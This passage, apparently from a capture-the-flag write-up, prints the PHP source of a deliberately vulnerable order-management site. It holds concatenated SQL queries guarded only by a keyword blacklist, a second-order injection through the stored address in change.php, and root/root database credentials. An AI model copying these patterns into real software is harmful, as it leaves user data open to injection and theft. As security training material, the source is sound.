src&#x3D;&quot;assets&#x2F;js&#x2F;bootstrap.min.js&quot;&gt;&lt;&#x2F;script&gt;</span><br><span class="line">&lt;script src&#x3D;&quot;assets&#x2F;js&#x2F;retina-1.1.0.js&quot;&gt;&lt;&#x2F;script&gt;</span><br><span class="line">&lt;script src&#x3D;&quot;assets&#x2F;js&#x2F;jquery.unveilEffects.js&quot;&gt;&lt;&#x2F;script&gt;</span><br><span class="line">&lt;&#x2F;body&gt;</span><br><span class="line">&lt;&#x2F;html&gt;</span><br><span class="line">&lt;!--?file&#x3D;?--&gt;</span><br></pre></td></tr></table></figure>

<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;&#x2F;search.php</span><br><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">require_once &quot;config.php&quot;; </span><br><span class="line"></span><br><span class="line">if(!empty($_POST[&quot;user_name&quot;]) &amp;&amp; !empty($_POST[&quot;phone&quot;]))</span><br><span class="line">&#123;</span><br><span class="line">    $msg &#x3D; &#39;&#39;;</span><br><span class="line">    $pattern &#x3D; &#39;&#x2F;select|insert|update|delete|and|or|join|like|regexp|where|union|into|load_file|outfile&#x2F;i&#39;;</span><br><span class="line">    $user_name &#x3D; $_POST[&quot;user_name&quot;];</span><br><span class="line">    $phone &#x3D; $_POST[&quot;phone&quot;];</span><br><span class="line">    if (preg_match($pattern,$user_name) || preg_match($pattern,$phone))&#123; </span><br><span class="line">        $msg &#x3D; &#39;no sql inject!&#39;;</span><br><span class="line">    &#125;else&#123;</span><br><span class="line">        $sql &#x3D; &quot;select * from &#96;user&#96; where &#96;user_name&#96;&#x3D;&#39;&#123;$user_name&#125;&#39; and &#96;phone&#96;&#x3D;&#39;&#123;$phone&#125;&#39;&quot;;</span><br><span class="line">        $fetch &#x3D; $db-&gt;query($sql);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    if (isset($fetch) &amp;&amp; $fetch-&gt;num_rows&gt;0)&#123;</span><br><span class="line">        $row &#x3D; $fetch-&gt;fetch_assoc();</span><br><span class="line">        if(!$row) &#123;</span><br><span class="line">            echo &#39;error&#39;;</span><br><span class="line">            print_r($db-&gt;error);</span><br><span class="line">            exit;</span><br><span class="line">        &#125;</span><br><span class="line">        $msg &#x3D; &quot;&lt;p&gt;姓名:&quot;.$row[&#39;user_name&#39;].&quot;&lt;&#x2F;p&gt;&lt;p&gt;, 电话:&quot;.$row[&#39;phone&#39;].&quot;&lt;&#x2F;p&gt;&lt;p&gt;, 地址:&quot;.$row[&#39;address&#39;].&quot;&lt;&#x2F;p&gt;&quot;;</span><br><span class="line">    &#125; else &#123;</span><br><span class="line">        $msg &#x3D; &quot;未找到订单!&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;else &#123;</span><br><span class="line">    $msg &#x3D; &quot;信息不全&quot;;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">&lt;meta charset&#x3D;&quot;utf-8&quot;&gt;</span><br><span class="line">&lt;title&gt;搜索&lt;&#x2F;title&gt;</span><br><span class="line">&lt;base href&#x3D;&quot;.&#x2F;&quot;&gt;</span><br><span class="line"></span><br><span class="line">&lt;link href&#x3D;&quot;assets&#x2F;css&#x2F;bootstrap.css&quot; rel&#x3D;&quot;stylesheet&quot;&gt;</span><br><span class="line">&lt;link href&#x3D;&quot;assets&#x2F;css&#x2F;custom-animations.css&quot; rel&#x3D;&quot;stylesheet&quot;&gt;</span><br><span class="line">&lt;link href&#x3D;&quot;assets&#x2F;css&#x2F;style.css&quot; rel&#x3D;&quot;stylesheet&quot;&gt;</span><br><span class="line"></span><br><span class="line">&lt;&#x2F;head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;div id&#x3D;&quot;h&quot;&gt;</span><br><span class="line">	&lt;div class&#x3D;&quot;container&quot;&gt;</span><br><span class="line">		&lt;div class&#x3D;&quot;row&quot;&gt;</span><br><span class="line">			&lt;div class&#x3D;&quot;col-md-8 col-md-offset-2 centered&quot;&gt;</span><br><span class="line">                &lt;p style&#x3D;&quot;margin:35px 0;&quot;&gt;&lt;br&gt;&lt;&#x2F;p&gt;</span><br><span class="line">                &lt;h1&gt;订单查询&lt;&#x2F;h1&gt;</span><br><span class="line">                &lt;form method&#x3D;&quot;post&quot;&gt;</span><br><span class="line">                    &lt;p&gt;</span><br><span class="line">                    &lt;h3&gt;姓名:&lt;&#x2F;h3&gt;</span><br><span class="line">                    &lt;input type&#x3D;&quot;text&quot; class&#x3D;&quot;subscribe-input&quot; name&#x3D;&quot;user_name&quot;&gt;</span><br><span class="line">                    &lt;h3&gt;电话:&lt;&#x2F;h3&gt;</span><br><span class="line">                    &lt;input type&#x3D;&quot;text&quot; class&#x3D;&quot;subscribe-input&quot; name&#x3D;&quot;phone&quot;&gt;</span><br><span class="line">                    &lt;&#x2F;p&gt;</span><br><span class="line">                    &lt;p&gt;</span><br><span class="line">                    &lt;button class&#x3D;&#39;btn btn-lg  btn-sub btn-white&#39; type&#x3D;&quot;submit&quot;&gt;查询订单&lt;&#x2F;button&gt;</span><br><span class="line">                    &lt;&#x2F;p&gt;</span><br><span class="line">                &lt;&#x2F;form&gt;</span><br><span class="line">                &lt;?php global $msg; echo &#39;&lt;h2 class&#x3D;&quot;mb&quot;&gt;&#39;.$msg.&#39;&lt;&#x2F;h2&gt;&#39;;?&gt;</span><br><span class="line">            &lt;&#x2F;div&gt;</span><br><span class="line">        &lt;&#x2F;div&gt;</span><br><span class="line">    &lt;&#x2F;div&gt;</span><br><span class="line">&lt;&#x2F;div&gt;</span><br><span class="line"></span><br><span class="line">&lt;div id&#x3D;&quot;f&quot;&gt;</span><br><span class="line">    &lt;div class&#x3D;&quot;container&quot;&gt;</span><br><span class="line">		&lt;div class&#x3D;&quot;row&quot;&gt;</span><br><span class="line">            &lt;p style&#x3D;&quot;margin:35px 0;&quot;&gt;&lt;br&gt;&lt;&#x2F;p&gt;</span><br><span class="line">            &lt;h2 class&#x3D;&quot;mb&quot;&gt;订单管理&lt;&#x2F;h2&gt;</span><br><span class="line">            &lt;a href&#x3D;&quot;.&#x2F;index.php&quot;&gt;</span><br><span class="line">                &lt;button class&#x3D;&#39;btn btn-lg btn-register btn-sub btn-white&#39;&gt;返回&lt;&#x2F;button&gt;</span><br><span class="line">            &lt;&#x2F;a&gt;</span><br><span class="line">            &lt;a href&#x3D;&quot;.&#x2F;change.php&quot;&gt;</span><br><span class="line">                &lt;button class&#x3D;&quot;btn btn-lg btn-register btn-white&quot; &gt;我要修改收货地址&lt;&#x2F;button&gt;</span><br><span class="line">            &lt;&#x2F;a&gt; </span><br><span class="line">            &lt;a href&#x3D;&quot;.&#x2F;delete.php&quot;&gt;</span><br><span class="line">                &lt;button class&#x3D;&quot;btn btn-lg btn-register btn-white&quot; &gt;我不想要了&lt;&#x2F;button&gt;</span><br><span class="line">            &lt;&#x2F;a&gt;    </span><br><span class="line">		&lt;&#x2F;div&gt;</span><br><span class="line">	&lt;&#x2F;div&gt;</span><br><span class="line">&lt;&#x2F;div&gt;</span><br><span class="line"></span><br><span class="line">&lt;script src&#x3D;&quot;assets&#x2F;js&#x2F;jquery.min.js&quot;&gt;&lt;&#x2F;script&gt;</span><br><span class="line">&lt;script src&#x3D;&quot;assets&#x2F;js&#x2F;bootstrap.min.js&quot;&gt;&lt;&#x2F;script&gt;</span><br><span class="line">&lt;script src&#x3D;&quot;assets&#x2F;js&#x2F;retina-1.1.0.js&quot;&gt;&lt;&#x2F;script&gt;</span><br><span class="line">&lt;script src&#x3D;&quot;assets&#x2F;js&#x2F;jquery.unveilEffects.js&quot;&gt;&lt;&#x2F;script&gt;</span><br><span class="line">&lt;&#x2F;body&gt;</span><br><span class="line">&lt;&#x2F;html&gt;</span><br></pre></td></tr></table></figure>

<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;&#x2F;change.php</span><br><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">require_once &quot;config.php&quot;;</span><br><span class="line"></span><br><span class="line">if(!empty($_POST[&quot;user_name&quot;]) &amp;&amp; !empty($_POST[&quot;address&quot;]) &amp;&amp; !empty($_POST[&quot;phone&quot;]))</span><br><span class="line">&#123;</span><br><span class="line">    $msg &#x3D; &#39;&#39;;</span><br><span class="line">    $pattern &#x3D; &#39;&#x2F;select|insert|update|delete|and|or|join|like|regexp|where|union|into|load_file|outfile&#x2F;i&#39;;</span><br><span class="line">    $user_name &#x3D; $_POST[&quot;user_name&quot;];</span><br><span class="line">    $address &#x3D; addslashes($_POST[&quot;address&quot;]);</span><br><span class="line">    $phone &#x3D; $_POST[&quot;phone&quot;];</span><br><span class="line">    if (preg_match($pattern,$user_name) || preg_match($pattern,$phone))&#123;</span><br><span class="line">        $msg &#x3D; &#39;no sql inject!&#39;;</span><br><span class="line">    &#125;else&#123;</span><br><span class="line">        $sql &#x3D; &quot;select * from &#96;user&#96; where &#96;user_name&#96;&#x3D;&#39;&#123;$user_name&#125;&#39; and &#96;phone&#96;&#x3D;&#39;&#123;$phone&#125;&#39;&quot;;</span><br><span class="line">        $fetch &#x3D; $db-&gt;query($sql);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    if (isset($fetch) &amp;&amp; $fetch-&gt;num_rows&gt;0)&#123;</span><br><span class="line">        $row &#x3D; $fetch-&gt;fetch_assoc();</span><br><span class="line">        $sql &#x3D; &quot;update &#96;user&#96; set &#96;address&#96;&#x3D;&#39;&quot;.$address.&quot;&#39;, &#96;old_address&#96;&#x3D;&#39;&quot;.$row[&#39;address&#39;].&quot;&#39; where &#96;user_id&#96;&#x3D;&quot;.$row[&#39;user_id&#39;];</span><br><span class="line">        $result &#x3D; $db-&gt;query($sql);</span><br><span class="line">        if(!$result) &#123;</span><br><span class="line">            echo &#39;error&#39;;</span><br><span class="line">            print_r($db-&gt;error);</span><br><span class="line">            exit;</span><br><span class="line">        &#125;</span><br><span class="line">        $msg &#x3D; &quot;订单修改成功&quot;;</span><br><span class="line">    &#125; else &#123;</span><br><span class="line">        $msg &#x3D; &quot;未找到订单!&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;else &#123;</span><br><span class="line">    $msg &#x3D; &quot;信息不全&quot;;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">&lt;meta charset&#x3D;&quot;utf-8&quot;&gt;</span><br><span class="line">&lt;title&gt;修改收货地址&lt;&#x2F;title&gt;</span><br><span class="line">&lt;base href&#x3D;&quot;.&#x2F;&quot;&gt;</span><br><span class="line"></span><br><span class="line">&lt;link href&#x3D;&quot;assets&#x2F;css&#x2F;bootstrap.css&quot; rel&#x3D;&quot;stylesheet&quot;&gt;</span><br><span class="line">&lt;link href&#x3D;&quot;assets&#x2F;css&#x2F;custom-animations.css&quot; rel&#x3D;&quot;stylesheet&quot;&gt;</span><br><span class="line">&lt;link href&#x3D;&quot;assets&#x2F;css&#x2F;style.css&quot; rel&#x3D;&quot;stylesheet&quot;&gt;</span><br><span class="line"></span><br><span class="line">&lt;&#x2F;head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;div id&#x3D;&quot;h&quot;&gt;</span><br><span class="line">	&lt;div class&#x3D;&quot;container&quot;&gt;</span><br><span class="line">		&lt;div class&#x3D;&quot;row&quot;&gt;</span><br><span class="line">			&lt;div class&#x3D;&quot;col-md-8 col-md-offset-2 centered&quot;&gt;</span><br><span class="line">                &lt;p style&#x3D;&quot;margin:35px 0;&quot;&gt;&lt;br&gt;&lt;&#x2F;p&gt;</span><br><span class="line">                &lt;h1&gt;修改收货地址&lt;&#x2F;h1&gt;</span><br><span class="line">                &lt;form method&#x3D;&quot;post&quot;&gt;</span><br><span class="line">                    &lt;p&gt;</span><br><span class="line">                    &lt;h3&gt;姓名:&lt;&#x2F;h3&gt;</span><br><span class="line">                    &lt;input type&#x3D;&quot;text&quot; class&#x3D;&quot;subscribe-input&quot; name&#x3D;&quot;user_name&quot;&gt;</span><br><span class="line">                    &lt;h3&gt;电话:&lt;&#x2F;h3&gt;</span><br><span class="line">                    &lt;input type&#x3D;&quot;text&quot; class&#x3D;&quot;subscribe-input&quot; name&#x3D;&quot;phone&quot;&gt;</span><br><span class="line">                    &lt;h3&gt;地址:&lt;&#x2F;h3&gt;</span><br><span class="line">                    &lt;input type&#x3D;&quot;text&quot; class&#x3D;&quot;subscribe-input&quot; name&#x3D;&quot;address&quot;&gt;</span><br><span class="line">                    &lt;&#x2F;p&gt;</span><br><span class="line">                    &lt;p&gt;</span><br><span class="line">                    &lt;button class&#x3D;&#39;btn btn-lg  btn-sub btn-white&#39; type&#x3D;&quot;submit&quot;&gt;修改订单&lt;&#x2F;button&gt;</span><br><span class="line">                    &lt;&#x2F;p&gt;</span><br><span class="line">                &lt;&#x2F;form&gt;</span><br><span class="line">                &lt;?php global $msg; echo &#39;&lt;h2 class&#x3D;&quot;mb&quot;&gt;&#39;.$msg.&#39;&lt;&#x2F;h2&gt;&#39;;?&gt;</span><br><span class="line">            &lt;&#x2F;div&gt;</span><br><span class="line">        &lt;&#x2F;div&gt;</span><br><span class="line">    &lt;&#x2F;div&gt;</span><br><span class="line">&lt;&#x2F;div&gt;</span><br><span class="line"></span><br><span class="line">&lt;div id&#x3D;&quot;f&quot;&gt;</span><br><span class="line">    &lt;div class&#x3D;&quot;container&quot;&gt;</span><br><span class="line">		&lt;div class&#x3D;&quot;row&quot;&gt;</span><br><span class="line">            &lt;p style&#x3D;&quot;margin:35px 0;&quot;&gt;&lt;br&gt;&lt;&#x2F;p&gt;</span><br><span class="line">            &lt;h2 class&#x3D;&quot;mb&quot;&gt;订单管理&lt;&#x2F;h2&gt;</span><br><span class="line">            &lt;a href&#x3D;&quot;.&#x2F;index.php&quot;&gt;</span><br><span class="line">                &lt;button class&#x3D;&#39;btn btn-lg btn-register btn-sub btn-white&#39;&gt;返回&lt;&#x2F;button&gt;</span><br><span class="line">            &lt;&#x2F;a&gt;</span><br><span class="line">            &lt;a href&#x3D;&quot;.&#x2F;search.php&quot;&gt;</span><br><span class="line">                &lt;button class&#x3D;&quot;btn btn-lg btn-register btn-white&quot; &gt;我要查订单&lt;&#x2F;button&gt;</span><br><span class="line">            &lt;&#x2F;a&gt;</span><br><span class="line">            &lt;a href&#x3D;&quot;.&#x2F;delete.php&quot;&gt;</span><br><span class="line">                &lt;button class&#x3D;&quot;btn btn-lg btn-register btn-white&quot; &gt;我不想要了&lt;&#x2F;button&gt;</span><br><span class="line">            &lt;&#x2F;a&gt;</span><br><span class="line">		&lt;&#x2F;div&gt;</span><br><span class="line">	&lt;&#x2F;div&gt;</span><br><span class="line">&lt;&#x2F;div&gt;</span><br><span class="line"></span><br><span class="line">&lt;script src&#x3D;&quot;assets&#x2F;js&#x2F;jquery.min.js&quot;&gt;&lt;&#x2F;script&gt;</span><br><span class="line">&lt;script src&#x3D;&quot;assets&#x2F;js&#x2F;bootstrap.min.js&quot;&gt;&lt;&#x2F;script&gt;</span><br><span class="line">&lt;script src&#x3D;&quot;assets&#x2F;js&#x2F;retina-1.1.0.js&quot;&gt;&lt;&#x2F;script&gt;</span><br><span class="line">&lt;script src&#x3D;&quot;assets&#x2F;js&#x2F;jquery.unveilEffects.js&quot;&gt;&lt;&#x2F;script&gt;</span><br><span class="line">&lt;&#x2F;body&gt;</span><br><span class="line">&lt;&#x2F;html&gt;</span><br></pre></td></tr></table></figure>

<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;&#x2F;delete.php</span><br><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">require_once &quot;config.php&quot;;</span><br><span class="line"></span><br><span class="line">if(!empty($_POST[&quot;user_name&quot;]) &amp;&amp; !empty($_POST[&quot;phone&quot;]))</span><br><span class="line">&#123;</span><br><span class="line">    $msg &#x3D; &#39;&#39;;</span><br><span class="line">    $pattern &#x3D; &#39;&#x2F;select|insert|update|delete|and|or|join|like|regexp|where|union|into|load_file|outfile&#x2F;i&#39;;</span><br><span class="line">    $user_name &#x3D; $_POST[&quot;user_name&quot;];</span><br><span class="line">    $phone &#x3D; $_POST[&quot;phone&quot;];</span><br><span class="line">    if (preg_match($pattern,$user_name) || preg_match($pattern,$phone))&#123; </span><br><span class="line">        $msg &#x3D; &#39;no sql inject!&#39;;</span><br><span class="line">    &#125;else&#123;</span><br><span class="line">        $sql &#x3D; &quot;select * from &#96;user&#96; where &#96;user_name&#96;&#x3D;&#39;&#123;$user_name&#125;&#39; and &#96;phone&#96;&#x3D;&#39;&#123;$phone&#125;&#39;&quot;;</span><br><span class="line">        $fetch &#x3D; $db-&gt;query($sql);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    if (isset($fetch) &amp;&amp; $fetch-&gt;num_rows&gt;0)&#123;</span><br><span class="line">        $row &#x3D; $fetch-&gt;fetch_assoc();</span><br><span class="line">        $result &#x3D; $db-&gt;query(&#39;delete from &#96;user&#96; where &#96;user_id&#96;&#x3D;&#39; . $row[&quot;user_id&quot;]);</span><br><span class="line">        if(!$result) &#123;</span><br><span class="line">            echo &#39;error&#39;;</span><br><span class="line">            print_r($db-&gt;error);</span><br><span class="line">            exit;</span><br><span class="line">        &#125;</span><br><span class="line">        $msg &#x3D; &quot;订单删除成功&quot;;</span><br><span class="line">    &#125; else &#123;</span><br><span class="line">        $msg &#x3D; &quot;未找到订单!&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;else &#123;</span><br><span class="line">    $msg &#x3D; &quot;信息不全&quot;;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">&lt;meta charset&#x3D;&quot;utf-8&quot;&gt;</span><br><span class="line">&lt;title&gt;删除订单&lt;&#x2F;title&gt;</span><br><span class="line">&lt;base href&#x3D;&quot;.&#x2F;&quot;&gt;</span><br><span class="line">&lt;meta charset&#x3D;&quot;utf-8&quot; &#x2F;&gt;</span><br><span class="line"></span><br><span class="line">&lt;link href&#x3D;&quot;assets&#x2F;css&#x2F;bootstrap.css&quot; rel&#x3D;&quot;stylesheet&quot;&gt;</span><br><span class="line">&lt;link href&#x3D;&quot;assets&#x2F;css&#x2F;custom-animations.css&quot; rel&#x3D;&quot;stylesheet&quot;&gt;</span><br><span class="line">&lt;link href&#x3D;&quot;assets&#x2F;css&#x2F;style.css&quot; rel&#x3D;&quot;stylesheet&quot;&gt;</span><br><span class="line"></span><br><span class="line">&lt;&#x2F;head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;div id&#x3D;&quot;h&quot;&gt;</span><br><span class="line">	&lt;div class&#x3D;&quot;container&quot;&gt;</span><br><span class="line">		&lt;div class&#x3D;&quot;row&quot;&gt;</span><br><span class="line">			&lt;div class&#x3D;&quot;col-md-8 col-md-offset-2 centered&quot;&gt;</span><br><span class="line">                &lt;p style&#x3D;&quot;margin:35px 0;&quot;&gt;&lt;br&gt;&lt;&#x2F;p&gt;</span><br><span class="line">                &lt;h1&gt;删除订单&lt;&#x2F;h1&gt;</span><br><span class="line">                &lt;form method&#x3D;&quot;post&quot;&gt;</span><br><span class="line">                    &lt;p&gt;</span><br><span class="line">                    &lt;h3&gt;姓名:&lt;&#x2F;h3&gt;</span><br><span class="line">                    &lt;input type&#x3D;&quot;text&quot; class&#x3D;&quot;subscribe-input&quot; name&#x3D;&quot;user_name&quot;&gt;</span><br><span class="line">                    &lt;h3&gt;电话:&lt;&#x2F;h3&gt;</span><br><span class="line">                    &lt;input type&#x3D;&quot;text&quot; class&#x3D;&quot;subscribe-input&quot; name&#x3D;&quot;phone&quot;&gt;</span><br><span class="line">                    &lt;&#x2F;p&gt;</span><br><span class="line">                    &lt;p&gt;</span><br><span class="line">                    &lt;button class&#x3D;&#39;btn btn-lg  btn-sub btn-white&#39; type&#x3D;&quot;submit&quot;&gt;删除订单&lt;&#x2F;button&gt;</span><br><span class="line">                    &lt;&#x2F;p&gt;</span><br><span class="line">                &lt;&#x2F;form&gt;</span><br><span class="line">                &lt;?php global $msg; echo &#39;&lt;h2 class&#x3D;&quot;mb&quot; style&#x3D;&quot;color:#ffffff;&quot;&gt;&#39;.$msg.&#39;&lt;&#x2F;h2&gt;&#39;;?&gt;</span><br><span class="line">            &lt;&#x2F;div&gt;</span><br><span class="line">        &lt;&#x2F;div&gt;</span><br><span class="line">    &lt;&#x2F;div&gt;</span><br><span class="line">&lt;&#x2F;div&gt;</span><br><span class="line">&lt;div id&#x3D;&quot;f&quot;&gt;</span><br><span class="line">    &lt;div class&#x3D;&quot;container&quot;&gt;</span><br><span class="line">		&lt;div class&#x3D;&quot;row&quot;&gt;</span><br><span class="line">            &lt;h2 class&#x3D;&quot;mb&quot;&gt;订单管理&lt;&#x2F;h2&gt;</span><br><span class="line">            &lt;a href&#x3D;&quot;.&#x2F;index.php&quot;&gt;</span><br><span class="line">                &lt;button class&#x3D;&#39;btn btn-lg btn-register btn-sub btn-white&#39;&gt;返回&lt;&#x2F;button&gt;</span><br><span class="line">            &lt;&#x2F;a&gt;</span><br><span class="line">            &lt;a href&#x3D;&quot;.&#x2F;search.php&quot;&gt;</span><br><span class="line">                &lt;button class&#x3D;&quot;btn btn-lg btn-register btn-white&quot; &gt;我要查订单&lt;&#x2F;button&gt;</span><br><span class="line">            &lt;&#x2F;a&gt;</span><br><span class="line">            &lt;a href&#x3D;&quot;.&#x2F;change.php&quot;&gt;</span><br><span class="line">                &lt;button class&#x3D;&quot;btn btn-lg btn-register btn-white&quot; &gt;我要修改收货地址&lt;&#x2F;button&gt;</span><br><span class="line">            &lt;&#x2F;a&gt;</span><br><span class="line">		&lt;&#x2F;div&gt;</span><br><span class="line">	&lt;&#x2F;div&gt;</span><br><span class="line">&lt;&#x2F;div&gt;</span><br><span class="line"></span><br><span class="line">&lt;script src&#x3D;&quot;assets&#x2F;js&#x2F;jquery.min.js&quot;&gt;&lt;&#x2F;script&gt;</span><br><span class="line">&lt;script src&#x3D;&quot;assets&#x2F;js&#x2F;bootstrap.min.js&quot;&gt;&lt;&#x2F;script&gt;</span><br><span class="line">&lt;script src&#x3D;&quot;assets&#x2F;js&#x2F;retina-1.1.0.js&quot;&gt;&lt;&#x2F;script&gt;</span><br><span class="line">&lt;script src&#x3D;&quot;assets&#x2F;js&#x2F;jquery.unveilEffects.js&quot;&gt;&lt;&#x2F;script&gt;</span><br><span class="line">&lt;&#x2F;body&gt;</span><br><span class="line">&lt;&#x2F;html&gt;</span><br></pre></td></tr></table></figure>

<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;&#x2F;config.php</span><br><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">ini_set(&quot;open_basedir&quot;, getcwd() . &quot;:&#x2F;etc:&#x2F;tmp&quot;);</span><br><span class="line"></span><br><span class="line">$DATABASE &#x3D; array(</span><br><span class="line"></span><br><span class="line">    &quot;host&quot; &#x3D;&gt; &quot;127.0.0.1&quot;,</span><br><span class="line">    &quot;username&quot; &#x3D;&gt; &quot;root&quot;,</span><br><span class="line">    &quot;password&quot; &#x3D;&gt; &quot;root&quot;,</span><br><span class="line">    &quot;dbname&quot; &#x3D;&gt;&quot;ctfusers&quot;</span><br><span class="line">);</span><br><span class="line"></span><br><span class="line">$db &#x3D; new mysqli($DATABASE[&#39;host&#39;],$DATABASE[&#39;username&#39;],$DATABASE[&#39;password&#39;],$DATABASE[&#39;dbname&#39;]);</span><br></pre></td></tr></table></figure>

<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;&#x2F;confirm.php</span><br><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">require_once &quot;config.php&quot;;</span><br><span class="line">&#x2F;&#x2F;var_dump($_POST);</span><br><span class="line"></span><br><span class="line">if(!empty($_POST[&quot;user_name&quot;]) &amp;&amp; !empty($_POST[&quot;address&quot;]) &amp;&amp; !empty($_POST[&quot;phone&quot;]))</span><br><span class="line">&#123;</span><br><span class="line">    $msg &#x3D; &#39;&#39;;</span><br><span class="line">    $pattern &#x3D; &#39;&#x2F;select|insert|update|delete|and|or|join|like|regexp|where|union|into|load_file|outfile&#x2F;i&#39;;</span><br><span class="line">    $user_name &#x3D; $_POST[&quot;user_name&quot;];</span><br><span class="line">    $address &#x3D; $_POST[&quot;address&quot;];</span><br><span class="line">    $phone &#x3D; $_POST[&quot;phone&quot;];</span><br><span class="line">    if (preg_match($pattern,$user_name) || preg_match($pattern,$phone))&#123;</span><br><span class="line">        $msg &#x3D; &#39;no sql inject!&#39;;</span><br><span class="line">    &#125;else&#123;</span><br><span class="line">        $sql &#x3D; &quot;select * from &#96;user&#96; where &#96;user_name&#96;&#x3D;&#39;&#123;$user_name&#125;&#39; and &#96;phone&#96;&#x3D;&#39;&#123;$phone&#125;&#39;&quot;;</span><br><span class="line">        $fetch &#x3D; $db-&gt;query($sql);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    if($fetch-&gt;num_rows&gt;0) &#123;</span><br><span class="line">        $msg &#x3D; $user_name.&quot;已提交订单&quot;;</span><br><span class="line">    &#125;else&#123;</span><br><span class="line">        $sql &#x3D; &quot;insert into &#96;user&#96; ( &#96;user_name&#96;, &#96;address&#96;, &#96;phone&#96;) values( ?, ?, ?)&quot;;</span><br><span class="line">        $re &#x3D; $db-&gt;prepare($sql);</span><br><span class="line">        $re-&gt;bind_param(&quot;sss&quot;, $user_name, $address, $phone);</span><br><span class="line">        $re &#x3D; $re-&gt;execute();</span><br><span class="line">        if(!$re) &#123;</span><br><span class="line">            echo &#39;error&#39;;</span><br><span class="line">            print_r($db-&gt;error);</span><br><span class="line">            exit;</span><br><span class="line">        &#125;</span><br><span class="line">        $msg &#x3D; &quot;订单提交成功&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125; else &#123;</span><br><span class="line">    $msg &#x3D; &quot;信息不全&quot;;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br><span class="line"></span><br><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html lang&#x3D;&quot;en&quot;&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">&lt;meta charset&#x3D;&quot;utf-8&quot;&gt;</span><br><span class="line">&lt;title&gt;确认订单&lt;&#x2F;title&gt;</span><br><span class="line">&lt;base href&#x3D;&quot;.&#x2F;&quot;&gt;</span><br><span class="line">&lt;meta charset&#x3D;&quot;utf-8&quot;&#x2F;&gt;</span><br><span class="line"></span><br><span class="line">&lt;link href&#x3D;&quot;assets&#x2F;css&#x2F;bootstrap.css&quot; rel&#x3D;&quot;stylesheet&quot;&gt;</span><br><span class="line">&lt;link href&#x3D;&quot;assets&#x2F;css&#x2F;custom-animations.css&quot; rel&#x3D;&quot;stylesheet&quot;&gt;</span><br><span class="line">&lt;link href&#x3D;&quot;assets&#x2F;css&#x2F;style.css&quot; rel&#x3D;&quot;stylesheet&quot;&gt;</span><br><span class="line"></span><br><span class="line">&lt;&#x2F;head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;div id&#x3D;&quot;h&quot;&gt;</span><br><span class="line">	&lt;div class&#x3D;&quot;container&quot;&gt;</span><br><span class="line">        &lt;img class&#x3D;&quot;logo&quot; src&#x3D;&quot;.&#x2F;assets&#x2F;img&#x2F;logo-zh.png&quot;&gt;</span><br><span class="line">        &lt;div class&#x3D;&quot;row&quot;&gt;</span><br><span class="line">            &lt;div class&#x3D;&quot;col-md-8 col-md-offset-2 centered&quot;&gt;</span><br><span class="line">                &lt;?php global $msg; echo &#39;&lt;h2 class&#x3D;&quot;mb&quot;&gt;&#39;.$msg.&#39;&lt;&#x2F;h2&gt;&#39;;?&gt;</span><br><span class="line">                &lt;a href&#x3D;&quot;.&#x2F;index.php&quot;&gt;</span><br><span class="line">                &lt;button class&#x3D;&#39;btn btn-lg  btn-sub btn-white&#39;&gt;返回&lt;&#x2F;button&gt;</span><br><span class="line">                &lt;&#x2F;a&gt;</span><br><span class="line">            &lt;&#x2F;div&gt;</span><br><span class="line">        &lt;&#x2F;div&gt;</span><br><span class="line">    &lt;&#x2F;div&gt;</span><br><span class="line">&lt;&#x2F;div&gt;</span><br><span class="line"></span><br><span class="line">&lt;div id&#x3D;&quot;f&quot;&gt;</span><br><span class="line">    &lt;div class&#x3D;&quot;container&quot;&gt;</span><br><span class="line">		&lt;div class&#x3D;&quot;row&quot;&gt;</span><br><span class="line">            &lt;p style&#x3D;&quot;margin:35px 0;&quot;&gt;&lt;br&gt;&lt;&#x2F;p&gt;</span><br><span class="line">            &lt;h2 class&#x3D;&quot;mb&quot;&gt;订单管理&lt;&#x2F;h2&gt;</span><br><span class="line">            &lt;a href&#x3D;&quot;.&#x2F;search.php&quot;&gt;</span><br><span class="line">                &lt;button class&#x3D;&quot;btn btn-lg btn-register btn-white&quot; &gt;我要查订单&lt;&#x2F;button&gt;</span><br><span class="line">            &lt;&#x2F;a&gt;</span><br><span class="line">            &lt;a href&#x3D;&quot;.&#x2F;change.php&quot;&gt;</span><br><span class="line">                &lt;button class&#x3D;&quot;btn btn-lg btn-register btn-white&quot; &gt;我要修改收货地址&lt;&#x2F;button&gt;</span><br><span class="line">            &lt;&#x2F;a&gt;</span><br><span class="line">            &lt;a href&#x3D;&quot;.&#x2F;delete.php&quot;&gt;</span><br><span class="line">                &lt;button 